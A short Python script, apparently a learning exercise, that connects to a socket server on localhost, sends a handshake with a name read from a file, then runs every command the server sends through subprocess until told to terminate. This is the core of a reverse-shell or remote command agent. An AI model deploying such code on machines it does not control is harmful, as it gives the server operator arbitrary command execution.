import socket
import subprocess
import shlex

with open("myInfo","r") as f:
    name = f.readline()

target_host = 'localhost'
target_port = 9999

def execute(cmd):
    # Removing whitespace from both the sides
    cmd = cmd.strip()
    if not cmd:
        return
    # Understand what the following line is doing
    output = subprocess.check_output(shlex.split(cmd),stderr=subprocess.STDOUT)
    return output.decode()

#Creating a socket
server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

#Connect the client
server.connect((target_host,target_port))

def Handshake():
    #Send some data
    server.send(b"Handshake Initialised from " + bytes(name,'utf-8'))

    #Receive data
    response = server.recv(4096)
    print(response.decode())
    return response.decode()

if __name__ == '__main__':
    response = ''
    ack = Handshake()
    if ack == 'ACK':
        while response != 'terminate':
            response = server.recv(4096)
            if response:
                print(execute(response))
    x = input(":")